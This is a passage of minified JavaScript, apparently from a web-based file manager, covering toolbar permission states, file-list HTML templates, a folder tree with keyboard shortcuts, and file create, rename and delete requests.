                t.canUpload = !0, (void 0 != i && "writeable" != i || a == G.KOD_GROUP_SHARE && "owner" != t.role && 1 != G.isRoot || a == G.KOD_USER_SHARE && "owner" != t.role && 1 != G.isRoot || a == G.KOD_GROUP_PATH && "guest" == t.role && 1 != G.isRoot || a == G.KOD_USER_FAV || a == G.KOD_USER_RECYCLE || a == G.KOD_GROUP_ROOT_ALL || a == G.KOD_GROUP_ROOT_SELF) && (t.canUpload = !1);
                var s = [G.KOD_USER_SHARE, G.KOD_USER_FAV, G.KOD_GROUP_ROOT_SELF, G.KOD_GROUP_ROOT_ALL],
                    r = ".kod-toolbar-recycle,.kod-toolbar-share";
                $(r).addClass("hidden"), a == G.KOD_USER_RECYCLE ? (o.removeClass(n).addClass("menu-recycle-body"), $(".tools-left .kod-toolbar").addClass("hidden"), $(".kod-toolbar-recycle").removeClass("hidden")) : -1 !== s.indexOf(a) ? -1 === core.pathClear(rtrim(G.thisPath, "/")).indexOf("/") ? (o.removeClass(n).addClass("menu-share-body"), $(".tools-left .kod-toolbar").addClass("hidden"), $(".kod-toolbar-share").removeClass("hidden"), t.id == G.userID ? ($(".menu-share-path-menu").find(".open-the-path,.share-edit,.remove").removeClass("hidden"), $(".menu-share-path-more").find(".remove").removeClass("hidden")) : ($(".menu-share-path-menu").find(".open-the-path,.share-edit,.remove").addClass("hidden"), $(".menu-share-path-more").find(".remove").addClass("hidden"))) : (o.removeClass(n).addClass("menu-body-main"), $(".tools-left .kod-toolbar").addClass("hidden"), $(".kod-toolbar-path").removeClass("hidden")) : (o.removeClass(n).addClass("menu-body-main"), $(".tools-lef .kod-toolbar").addClass("hidden"), $(".kod-toolbar-path").removeClass("hidden")), currentPathMenu(e)
            }
        },
        currentPathMenu = function(e) {
            var t = e.info,
                a = e.pathReadWrite,
                i = t.pathType,
                n = ".create-link,.create-project,.cute,.remove,.rname,.zip,.unzip-this,.unzip-folder,.newfile,.newfolder,.new-file-other,.app-create,.app-install,.past,.upload,.clone",
                o = "disable",
                s = $(".kod-toolbar-path .btn").not(".toolbar-path-more"),
                r = $("ul.menu-folder,ul.menu-more,ul.menu-file,ul.file-continerMenu");
            t.canUpload ? (r.find(n).removeClass(o), $(".path-tips").hide(), s.removeClass("disabled")) : (s.addClass("disabled"), r.find(n).addClass(o), $(".path-tips span").html(LNG.only_read), i == G.KOD_USER_RECYCLE || i == G.KOD_USER_SHARE ? ($(".path-tips").hide(), s.removeClass("disabled"), i == G.KOD_USER_SHARE && G.userID != t.id && s.addClass("disabled")) : $(".path-tips").show());
            var l = $(".group-space-use");
            if ((i == G.KOD_GROUP_PATH || i == G.KOD_GROUP_SHARE) && G.isRoot || i == G.KOD_GROUP_PATH && "owner" == t.role) {
                var c = e.groupSpaceUse;
                if (c) {
                    var d = core.userSpaceHtml(c.sizeUse + "/" + c.sizeMax);
                    l.removeClass("hidden").html(d)
                } else l.addClass("hidden")
            } else l.addClass("hidden");
            if (e.userSpace) {
                var c = e.userSpace,
                    d = core.userSpaceHtml(c.sizeUse + "/" + c.sizeMax);
                $(".user-space-info").html(d)
            }
            if ("notExists" == a && ($(".path-tips span").html(LNG.not_exists), $(".path-tips").show()), $(".role-label-box").html(""), i == G.KOD_GROUP_SHARE) {
                var p = "<span class='label label-grey-light' title-timeout='0' title='" + LNG.group_guest_desc + "'>" + LNG.group_guest + "<span>";
                $(".role-label-box").html(p), G.isRoot && $(".role-label-box").html("")
            } else if (i == G.KOD_GROUP_PATH && t.groupRole) {
                var p = "<span class='label label-" + t.groupRole.style + "' title-timeout='0' title='" + LNG.group_role_lebel_desc + "'>" + t.groupRole.name + "<span>";
                $(".role-label-box").html(p)
            }(i == G.KOD_GROUP_ROOT_ALL || i == G.KOD_GROUP_ROOT_SELF || i == G.KOD_USER_FAV || i == G.KOD_GROUP_SHARE) && $(".path-tips").hide(), 1 == G.isRoot && t.adminRealPath ? $(".admin-real-path").removeClass("hidden") : $(".admin-real-path").addClass("hidden")
        };
    return {
        f5: f5,
        f5Callback: f5Callback,
        pathTypeChange: pathTypeChange,
        pathChildrenTree: pathChildrenTree,
        pathChildrenSplit: pathChildrenSplit,
        init: function() {
            $(window).bind("resize", function() {
                resetTotalHeight(), core.isApp("desktop") ? ui.resetDesktopIcon() : ui.headerAddress.resetWidth()
            }), bindScrollLoadMore()
        }
    }
}), define("app/path/tpl/file/list.html", [], "<!-- 图标模式文件夹 -->\n{{if type=='icon-folder'}}\n<div data-path=\"{{list.path |kod.window.pathHashEncode}}\"\nclass='file {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}folder-box menu-folder{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n	{{if !list.isWriteable}} file-not-writeable{{/if}}\n	{{if !list.isReadable}}  file-not-readable{{/if}}\n{{/if}}'\ntitle='{{LNG.name}}:{{list.name}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"0\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	<div class='ico' filetype='folder'>\n		{{fileIconMake('folder','icon',list)}}\n	</div>\n	{{if list.metaInfo}}\n		<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n	{{/if}}\n	<div class='filename'>\n		<span class='title db-click-rename' title=\"{{LNG.double_click_rename}}\">\n			{{if typeof(list.exists)=='number' && list.exists==0}}\n				<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n			{{else}}\n				{{list.name}}\n			{{/if}}\n		</span>\n	</div>\n</div>\n\n<!-- 列表模式文件夹 -->\n{{else if type=='list-folder'}}\n<div data-path='{{list.path |kod.window.pathHashEncode}}'\nclass='file\n{{if index%2==0}}file2{{/if}} {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}folder-box menu-folder{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n{{if !list.isWriteable}} file-not-writeable{{/if}}\n{{if !list.isReadable}} file-not-readable{{/if}}{{/if}}'\ntitle='{{LNG.name}} : {{list.name}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"0\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	<div class='filename'>\n		{{if list.metaInfo}}\n			<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n		{{/if}}\n		<span class=\"children-more\">\n			{{if list.isParent&&list.isReadable}}<i class=\"font-icon children-more-cert\"></i>{{/if}}\n		</span>\n		<div class='ico' filetype='folder'>\n			{{fileIconMake('folder','list',list)}}\n		</div>\n		<span class='title db-click-rename' title=\"{{LNG.double_click_rename}}\">\n			{{if typeof(list.exists)=='number' && list.exists==0}}\n				<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n			{{else}}\n				{{list.name}}\n			{{/if}}\n		</span>\n	</div>\n	<div class='filetype'>{{LNG.folder}}</div>\n	<div class='filesize'></div>\n	<div class='filetime'>{{list.mtime || \"\"}}</div>\n	<div style='clear:both'></div>\n</div>\n{{if list.isParent&&list.isReadable}}\n<div data-path-children='{{list.path |kod.window.pathHashEncode}}' class=\"children-list hidden\"></div>\n{{/if}}\n\n<!-- 分栏模式文件夹 -->\n{{else if type=='split-folder'}}\n<div data-path='{{list.path |kod.window.pathHashEncode}}'\nclass='file file2 {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}folder-box menu-folder{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n{{if !list.isWriteable}} file-not-writeable{{/if}}\n{{if !list.isReadable}} file-not-readable{{/if}}{{/if}}'\ntitle='{{LNG.name}}:{{list.name}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"0\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	<div class='filename'>\n		{{if list.metaInfo}}\n			<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n		{{/if}}\n		<div class='ico' filetype='folder'>\n			{{fileIconMake('folder','split',list)}}\n		</div>\n		<span class='title'>\n			{{if typeof(list.exists)=='number' && list.exists==0}}\n				<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n			{{else}}\n				{{list.name}}\n			{{/if}}\n		</span>\n		<span class=\"children-open\">\n			{{if list.isReadable && typeof(list.menuType)==\"undefined\"}}\n				<i class=\"font-icon children-more-cert\"></i>\n			{{/if}}\n		</span>\n	</div>\n</div>\n\n<!-- 图标模式文件  draggable=\"true\"  ondragstart=\"return false;\"-->\n{{else if type=='icon-file'}}\n<div data-path='{{list.path |kod.window.pathHashEncode}}'\nclass='file {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}file-box menu-file{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n{{if !list.isWriteable}} file-not-writeable{{/if}}\n{{if !list.isReadable}} file-not-readable{{/if}}{{/if}}'\n{{if list.ext=='oexe'}}data-app='{{kod.window.base64Encode(kod.window.jsonEncode(list))}}'{{/if}}\ntitle='{{LNG.name}}:{{list.name}}&#10;{{LNG.size}}:{{list.size |pathTools.fileSize}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"{{list.size}}\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	{{fileIconMake('file','icon',list)}}\n	{{if list.metaInfo}}\n		<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n	{{/if}}\n	<div class='filename'>\n		<span class='title db-click-rename' title=\"{{LNG.double_click_rename}}\">\n		{{if typeof(list.exists)=='number' && list.exists==0}}\n			<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n		{{else}}\n			{{if list.ext=='oexe'}}{{list.name.replace('.oexe','')}}{{else}}{{list.name}}{{/if}}\n		{{/if}}\n		</span>\n	</div>\n</div>\n\n<!-- 列表模式文件 -->\n{{else if type=='list-file'}}\n<div data-path='{{list.path |kod.window.pathHashEncode}}'\nclass='file {{if index%2==0}}file2{{/if}} {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}file-box menu-file{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n{{if !list.isWriteable}} file-not-writeable{{/if}}\n{{if !list.isReadable}} file-not-readable{{/if}}{{/if}}'\n{{if list.ext=='oexe'}} data-app='{{kod.window.base64Encode(kod.window.jsonEncode(list))}}'{{/if}}\ntitle='{{LNG.name}}:{{list.name}}&#10;{{LNG.size}}:{{list.size |pathTools.fileSize}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"{{list.size}}\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	<div class='filename'>\n		<span class=\"children-more\"></span>\n		{{fileIconMake('file','list',list)}}\n		{{if list.metaInfo}}\n			<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n		{{/if}}\n		<span class='title db-click-rename' title=\"{{LNG.double_click_rename}}\">\n		{{if typeof(list.exists)=='number' && list.exists==0}}\n			<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n		{{else}}\n			{{if list.ext=='oexe'}}{{list.name.replace('.oexe','')}}{{else}}{{list.name}}{{/if}}\n		{{/if}}\n		</span>\n	</div>\n	<div class='filetype'>{{list.ext |kod.window.htmlEncode}} {{LNG.file}}</div>\n	<div class='filesize'>{{list.size |pathTools.fileSize}}</div>\n	<div class='filetime'>{{list.mtime || \"\"}}</div>\n	<div style='clear:both'></div>\n</div>\n\n<!-- 分栏模式文件 -->\n{{else if type=='split-file'}}\n<div data-path='{{list.path |kod.window.pathHashEncode}}'\nclass='file file2 {{list.menuType}}\n{{if list.menuType}}systemBox{{else}}file-box menu-file{{/if}}\n{{if !list.sid && typeof(list.isReadable)!=\"undefined\"}}\n{{if !list.isWriteable}} file-not-writeable{{/if}}\n{{if !list.isReadable}} file-not-readable{{/if}}{{/if}}'\n{{if list.ext=='oexe'}} data-app='{{kod.window.base64Encode(kod.window.jsonEncode(list))}}'{{/if}}\ntitle='{{LNG.name}}:{{list.name}}&#10;{{LNG.size}}:{{list.size |pathTools.fileSize}}&#10;{{LNG.permission}} : {{list.mode}}&#10;{{LNG.modify_time}} : {{list.mtime}}'\ndata-size=\"{{list.size}}\">\n	{{if !list.menuType}}<div class=\"item-select\"><div class=\"item-check\"></div></div>{{/if}}\n	<div class=\"item-menu\"><div class=\"cert\"></div></div>\n	<div class='filename'>\n		{{fileIconMake('file','split',list)}}\n		{{if list.metaInfo}}\n			<div class='meta-info {{list.metaInfo}}'>{{list.metaInfo |kod.core.icon}}</div>\n		{{/if}}\n		<span class='title'>\n		{{if typeof(list.exists)=='number' && list.exists==0}}\n			<b style=\"color:red;\" class=\"file-not-exists\">{{list.name}}</b>\n		{{else}}\n			{{if list.ext=='oexe'}}{{list.name.replace('.oexe','')}}{{else}}{{list.name}}{{/if}}\n		{{/if}}\n		</span>\n	</div>\n</div>\n{{/if}}\n\n"), define("app/common/tree", ["../path/pathOperate", "../path/clipboard", "../path/search"], function(e) {
    var t, a, i = e("../path/pathOperate"),
        n = e("../path/clipboard"),
        o = e("../path/search"),
        s = !1;
    ui.pathOperate = i;
    var r = function(e, t) {
            var a = ["menu-tree-group", "menu-tree-fav", "menu-tree-folder-fav"];
            if (e && e[0] && -1 !== $.inArray(e[0].menuType, a)) return e;
            for (var i = [], n = [], o = 0; e.length > o; o++) e[o].drop = !1, e[o].drag = !1, e[o].name = e[o].name, e[o].isParent && e[o].children && (e[o].children = r(e[o].children)), e[o].isWriteable, "folder" == e[o].type ? n.push(e[o]) : i.push(e[o]);
            return t ? e : (n = n.sort(function(e, t) {
                var e = e.name,
                    t = t.name;
                return pathTools.strSort(e, t)
            }), i = i.sort(function(e, t) {
                var e = e.name,
                    t = t.name;
                return pathTools.strSort(e, t)
            }), n.concat(i))
        },
        l = function() {
            var e = {},
                t = "tree_open_" + md5(Config.pageApp),
                i = function(e) {
                    if (!LocalData.support()) return {};
                    if (void 0 == e) {
                        var a = LocalData.getConfig(t);
                        return 0 == a ? {} : a
                    }
                    LocalData.setConfig(t, e)
                },
                n = function(t) {
                    for (var a = 0; t.length > a; a++) {
                        var i = t[a].path;
                        void 0 !== e[i] && (t[a].open = e[i])
                    }
                    return t
                },
                o = function() {
                    for (var t = a.getNodesByFilter(function(e) {
                            return 0 == e.level ? !0 : !1
                        }), n = {}, o = 0; t.length > o; o++) n[t[o].path] = t[o].open;
                    return e = n, i(e), e
                };
            return e = i(), {
                list: function() {
                    return e
                },
                reset: n,
                save: function() {
                    setTimeout(o, 50)
                }
            }
        }(),
        c = function() {
            $.ajax({
                url: G.appHost + Config.treeAjaxURL + "&type=init",
                dataType: "json",
                error: function() {
                    $("#folder-list-tree").html('<div style="text-align:center;">' + LNG.system_error + "</div>")
                },
                success: function(e) {
                    if (!e.code) return $("#folder-list-tree").html('<div style="text-align:center;">' + LNG.system_error + "</div>"), void 0;
                    var t = r(e.data, !0);
                    t = l.reset(t), $.fn.zTree.init($("#folder-list-tree"), f, t), a = $.fn.zTree.getZTreeObj("folder-list-tree")
                }
            }), $(".ztree .switch").die("mouseenter").live("mouseenter", function() {
                $(this).addClass("switch_hover")
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass("switch_hover")
            }), core.isApp("editor") && (Mousetrap.bind("up", function(e) {
                d(e, "up")
            }).bind("down", function(e) {
                d(e, "down")
            }).bind("left", function(e) {
                d(e, "left")
            }).bind("right", function(e) {
                d(e, "right")
            }), Mousetrap.bind("enter", function() {
                tree.open()
            }).bind(["del", "command+backspace"], function() {
                tree.remove()
            }).bind("f2", function(e) {
                stopPP(e), tree.rname()
            }).bind(["ctrl+f", "command+f"], function(e) {
                stopPP(e), tree.search()
            }).bind(["ctrl+c", "command+c"], function() {
                tree.copy()
            }).bind(["ctrl+x", "command+x"], function() {
                tree.cute()
            }).bind(["ctrl+v", "command+v"], function() {
                tree.past()
            }).bind("alt+m", function() {
                tree.create("folder")
            }).bind("alt+n", function() {
                tree.create("file")
            }))
        },
        d = function(e, t) {
            stopPP(e);
            var i = a.getSelectedNodes()[0];
            if (i) switch (t) {
                case "up":
                    var n = i.getPreNode();
                    if (n) {
                        if (n.open && n.children.length > 0)
                            for (; n.open && n.children && n.children.length >= 1;) n = n.children[n.children.length - 1]
                    } else n = i.getParentNode();
                    a.selectNode(n);
                    break;
                case "down":
                    if (i.open && i.children.length >= 1) n = i.children[0];
                    else {
                        var o = i,
                            n = o.getNextNode() || o.getParentNode().getNextNode();
                        try {
                            for (; !n;) o = o.getParentNode(), n = o.getNextNode() || o.getParentNode().getNextNode()
                        } catch (e) {}
                    }
                    a.selectNode(n);
                    break;
                case "left":
                    i.isParent ? i.open ? a.expandNode(i, !1) : a.selectNode(i.getParentNode()) : a.selectNode(i.getParentNode());
                    break;
                case "right":
                    i.open ? a.selectNode(i.children[0]) : a.expandNode(i, !0);
                    break;
                default:
            }
        },
        p = function() {
            return core.isApp("editor") ? !1 : !0
        },
        f = {
            async: {
                enable: !0,
                dataType: "json",
                url: function() {
                    return G.appHost + Config.treeAjaxURL
                },
                autoParam: ["ajax_path=path", "tree_icon=tree_icon"],
                dataFilter: function(e, t, a) {
                    return a.code ? r(a.data) : null
                }
            },
            edit: {
                enable: !0,
                showRemoveBtn: !1,
                showRenameBtn: !1,
                drag: {
                    isCopy: !1,
                    isMove: !1
                }
            },
            view: {
                showLine: !1,
                selectedMulti: !1,
                expandSpeed: "fast",
                dblClickExpand: !1,
                addDiyDom: function(e, t) {
                    var a = 15,
                        i = $("#" + t.tId + "_switch"),
                        n = $("#" + t.tId + "_ico");
                    i.remove(), t.iconSkin = t.tree_icon;
                    var o = t.tree_icon;
                    if (t.ext ? o = t.ext : t.tree_icon || (o = t.type), n.before(i).before('<span id="' + t.tId + '_my_ico"  class="tree_icon button">' + core.iconSmall(o) + "</span>").remove(), void 0 != t.ext && n.attr("class", "").addClass("file " + t.ext).removeAttr("style"), t.level >= 1) {
                        var s = "<span class='space' style='display: inline-block;width:" + a * t.level + "px'></span>";
                        i.before(s)
                    }
                    i.before("<div class='menu-item'><div class='cert'></div></div>");
                    var r = "";
                    void 0 != t.menuType ? r = t.menuType : (("file" == t.type || "oexe" == t.ext) && (r = "menu-tree-file"), "folder" == t.type && (r = "menu-tree-folder"));
                    var l = LNG.name + ":" + t.name + "\n" + LNG.size + ":" + pathTools.fileSize(t.size) + "\n" + LNG.modify_time + ":" + t.mtime;
                    "file" != t.type && (l = t.name), i.parent().addClass(r).attr("title", l), 0 == t.isWriteable && i.parent().addClass("file-not-writeable"), 0 == t.isReadable && i.parent().addClass("file-not-readable"), 0 === t.exists && i.parent().addClass("file-not-readable")
                }
            },
            callback: {
                onClick: function(e, t, i) {
                    if (0 == i.level && l.save(), $(e.target).hasClass("menu-item") || $(e.target).parent().hasClass("menu-item")) {
                        var n = $("#" + i.tId + "_a"),
                            o = n.find(".menu-item");
                        return n.contextMenu({
                            x: o.offset().left + o.width(),
                            y: o.offset().top
                        }), stopPP(e)
                    }
                    return a.selectNode(i), core.isApp("editor") && "folder" == i.type ? (a.expandNode(i), void 0) : (core.isApp("editor") || "folder" != i.type ? (kodApp.setLastOpenTarget($("#" + i.tId)), kodApp.open(u().path)) : ui.path.list(i.path), void 0)
                },
                beforeDblClick: function() {
                    return !0
                },
                onCollapse: function(e, t, a) {
                    0 == a.level && l.save()
                },
                onExpand: function(e, t, a) {
                    0 == a.level && l.save()
                },
                onDblClick: function(e, t, i) {
                    return $(e.target).hasClass("switch") || !p() ? !1 : (a.expandNode(i), void 0)
                },
                beforeRightClick: function(e, t) {
                    a.selectNode(t)
                },
                beforeAsync: function(e, t) {
                    t.ajax_name = t.name, t.ajax_path = t.path, $("#" + t.tId + "_my_ico").addClass("ico_loading")
                },
                onAsyncSuccess: function(e, i, n, o) {
                    return $("#" + n.tId + "_my_ico").removeClass("ico_loading"), 0 == o.data.length ? (a.removeChildNodes(n), void 0) : ("function" == typeof t && (t(), t = void 0), void 0)
                },
                onRename: function(e, n, o) {
                    var s = o.getParentNode();
                    if (a.getNodesByParam("name", o.name, s).length > 1) return Tips.tips(LNG.name_isexists, !1), a.removeNode(o), void 0;
                    if (o.create) {
                        var r = o.path + "/" + o.name;
                        "folder" == o.type ? i.newFolder(r, function() {
                            t = function() {
                                var e = a.getNodesByParam("name", o.name, s)[0];
                                a.selectNode(e), b()
                            }, h(s)
                        }) : i.newFile(r, function() {
                            t = function() {
                                var e = a.getNodesByParam("name", o.name, s)[0];
                                a.selectNode(e), b()
                            }, h(s)
                        })
                    } else {
                        var l = rtrim(o.path, "/"),
                            c = core.pathFather(o.path) + o.name;
                        i.rname(l, c, function(e) {
                            o.path = e, t = function() {
                                var e = a.getNodesByParam("name", o.name, s)[0];
                                a.selectNode(e), b(), "folder" == o.type && ui.path.list(o.path)
                            }, h(s)
                        })
                    }
                },
                beforeDrag: function(e, t) {
                    for (var a = 0, i = t.length; i > a; a++)
                        if (t[a].drag === !1) return !1;
                    return !0
                },
                beforeDrop: function(e, t, a) {
                    return a ? a.drop !== !1 : !0
                },
                onDrop: function(e, t, a, i) {
                    var o = "",
                        s = "",
                        r = a[0];
                    (r.father || r.thisPath) && (o = r.father + urlEncode(r.name), s = i.father + urlEncode(i.name), n.cuteDrag([{
                        path: o,
                        type: r.type
                    }], s, function() {
                        h(r)
                    }))
                }
            }
        },
        u = function(e) {
            if (a) {
                var t = a.getSelectedNodes()[0],
                    i = "";
                return t ? (i = t.type, ("_null_" == i || void 0 == i) && (i = "folder"), "file" == i && (i = t.ext), e ? [{
                    path: t.path,
                    type: i,
                    node: t
                }] : {
                    path: t.path,
                    type: i,
                    node: t
                }) : {
                    path: "",
                    type: ""
                }
            }
        },
        h = function(e) {
            return e || (e = a.getSelectedNodes()[0]), e.isParent || (e = e.getParentNode()) ? (a.reAsyncChildNodes(e, "refresh"), void 0) : (ui.tree.init(), void 0)
        },
        m = function() {
            g(G.KOD_USER_FAV), b()
        },
        v = function() {
            m(), g(G.KOD_GROUP_ROOT_SELF), g(G.KOD_GROUP_ROOT_ALL)
        },
        g = function(e) {
            var t = a.getNodesByParam("path", e, null);
            h(t[0])
        },
        b = function() {
            core.isApp("explorer") && ui.f5()
        };
    return {
        makeParam: u,
        treeOpenHistory: l,
        treeDataSort: r,
        init: c,
        refresh: h,
        refreshPath: g,
        refreshFav: m,
        refreshGroup: v,
        zTree: function() {
            return a
        },
        openEditor: function() {
            kodApp.open(u().path)
        },
        openWindow: function() {
            kodApp.openWindow(u().path)
        },
        share: function() {
            i.share(u())
        },
        download: function() {
            "folder" == u().type ? i.zipDownload(u(!0)) : kodApp.download(u().path)
        },
        setSelect: function(e) {
            return
        },
        open: function() {
            if (!($(".dialog-path-remove").length >= 1)) {
                var e = u();
                "oexe" == e.type && (e.path = e.node), kodApp.setLastOpenTarget($(".curSelectedNode").parent()), kodApp.open(e.path, e.type)
            }
        },
        fav: function() {
            var e = u();
            e.name = e.node.name, e.node = "null", i.fav(e)
        },
        createLink: function(e) {
            var t = u();
            i.createLink(t.path, t.node.name, t.type, e, b)
        },
        search: function() {
            o("", u().path)
        },
        appEdit: function() {
            var e = u(),
                t = e.node;
            t.path = e.path, i.appEdit(t, function() {
                h(e.node.getParentNode())
            })
        },
        info: function() {
            i.info(u(!0))
        },
        copy: function() {
            n.copy(u(!0))
        },
        cute: function() {
            n.cute(u(!0))
        },
        copyTo: function() {
            core.api.pathSelect({
                type: "folder",
                title: LNG.copy_to
            }, function(e) {
                n.copyDrag(u(!0), e, "", !1)
            })
        },
        cuteTo: function() {
            core.api.pathSelect({
                type: "folder",
                title: LNG.cute_to
            }, function(e) {
                n.cuteDrag(u(!0), e, function() {
                    g()
                })
            })
        },
        past: function() {
            var e = u();
            e.node.isParent || (e.node = e.node.getParentNode()), n.past(e.path, function() {
                b(), h(e.node)
            })
        },
        clone: function() {
            var e = u();
            e.node.isParent || (e.node = e.node.getParentNode()), n.copyDrag(u(!0), core.pathFather(e.path), function() {
                b(), "folder" == e.type ? h(e.node.getParentNode()) : h(e.node)
            }, !0)
        },
        favRemove: function() {
            i.favRemove(u().node.name, function(e) {
                Tips.tips(e), m()
            })
        },
        remove: function() {
            var e = u(!0),
                t = e[0].node.getParentNode();
            e[0].type = e[0].node.type, e[0].type = "folder" == e[0].type ? "folder" : "file", i.remove(e, function() {
                b(), h(t)
            })
        },
        checkIfChange: function(e) {
            s || (s = !0, a && (a.getNodesByFilter(function(t) {
                var a = t.path;
                return "folder" == t.type && core.pathClear(a) == core.pathClear(e) && h(t), !1
            }, !0), setTimeout(function() {
                s = !1
            }, 500)))
        },
        explorer: function() {
            var e = a.getSelectedNodes();
            if (0 >= e.length) {
                var t = a.getNodes();
                a.selectNode(t[0])
            }
            var i = u().path;
            "folder" != u().type && (i = core.pathFather(i)), core.explorer(i)
        },
        openProject: function() {
            core.explorerCode(u().path)
        },
        create: function(e) {
            var i = a.getSelectedNodes();
            if (0 >= i.length) {
                var n = a.getNodes();
                a.selectNode(n[0])
            } else "file" == i[0].type && a.selectNode(i[0].getParentNode());
            var o = u(),
                s = o.node,
                r = s.getParentNode(),
                l = "newfile",
                c = 0,
                d = LNG.newfolder;
            if ("folder" == e) {
                for (; a.getNodesByParam("name", d + "(" + c + ")", r).length > 0;) c++;
                newNode = {
                    name: d + "(" + c + ")",
                    ext: "",
                    type: "folder",
                    create: !0,
                    path: o.path
                }
            } else {
                for (var p = e; a.getNodesByParam("name", l + "(" + c + ")." + p, r).length > 0;) c++;
                newNode = {
                    name: l + "(" + c + ")." + p,
                    ext: p,
                    type: "file",
                    create: !0,
                    path: o.path
                }
            }
            if (void 0 != s.children) {
                var f = a.addNodes(s, newNode)[0];
                a.editName(f)
            } else "folder" != s.type && (s = s.getParentNode()), t = function() {
                var e = a.addNodes(s, newNode)[0];
                a.editName(e)
            }, s.isParent ? a.expandNode(s) : t()
        },
        showFile: function() {
            var e = G.appHost + "share/file&sid=" + G.sid + "&user=" + G.user + "&path=" + u().path;
            window.open(e)
        },
        rname: function() {
            var e = a.getSelectedNodes()[0];
            a.editName(e), e.beforeName = e.name
        }
    }
}), define("app/path/pathOperate", [], function(e) {
    tplFileInfo = e("./tpl/fileinfo/fileInfo.html"), tplPathInfo = e("./tpl/fileinfo/pathInfo.html");
    var t = ["/", "\\", ":", "*", "?", '"', "<", ">", "|"],
        a = ["/", "\\"],
        i = function(e) {
            var i = function(e, t) {
                    for (var a = t.length, i = 0; a > i; i++)
                        if (e.indexOf(t[i]) > 0) return !0;
                    return !1
                },
                n = a;
            return G.systemOS && "windows" == G.systemOS && (n = t), i(e, n) ? (Tips.tips(LNG.path_not_allow + ":    " + n.join(", "), !1), !1) : !0
        },
        n = function(e) {
            for (var t = [], a = function(e) {
                    return e ? e.replace(/"/g, '\\\\"') : e
                }, i = 0; e.length > i; i++) t.push({
                type: a(e[i].type),
                path: urlEncode(a(e[i].path))
            });
            return "dataArr=" + jsonEncode(t)
        },
        o = function(e, t) {
            if (e) {
                var a = core.pathThis(e);
                return i(a) ? ($.ajax({
                    dataType: "json",
                    url: G.appHost + "explorer/mkfile&path=" + urlEncode(e),
                    beforeSend: function() {
                        Tips.loading()
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        Tips.close(e), "function" == typeof t && (e && e.info ? t(e.info) : t(!1))
                    }
                }), void 0) : ("function" == typeof t && t(), void 0)
            }
        },
        s = function(e, t) {
            if (e) {
                var a = core.pathThis(e);
                return i(a) ? ($.ajax({
                    dataType: "json",
                    url: G.appHost + "explorer/mkdir&path=" + urlEncode(e),
                    beforeSend: function() {
                        "function" == typeof t && Tips.loading()
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        Tips.close(e), "function" == typeof t && (e && e.info ? t(e.info) : t(!1))
                    }
                }), void 0) : ("function" == typeof t && t(), void 0)
            }
        },
        r = function(e, t, a) {
            return e && t && e != t ? i(core.pathThis(t)) ? ($.ajax({
                type: "POST",
                dataType: "json",
                url: G.appHost + "explorer/pathRname",
                data: "path=" + urlEncode(e) + "&rnameTo=" + urlEncode(t),
                beforeSend: function() {
                    Tips.loading()
                },
                error: core.ajaxError,
                success: function(e) {
                    Tips.close(e), "function" == typeof a && (e && e.info ? a(e.info) : a(!1))
                }
            }), void 0) : ("function" == typeof a && a(), void 0) : void 0
        },
        l = function(e, t, a, i) {
            if (a = void 0 == a ? !1 : a, i = void 0 == i ? !1 : i, window.event && window.event.shiftKey && (i = !0), !(1 > e.length)) {
                var o = LNG.remove_title,
                    s = LNG.remove_info,
                    r = G.appHost + "explorer/pathDelete",
                    l = n(e);
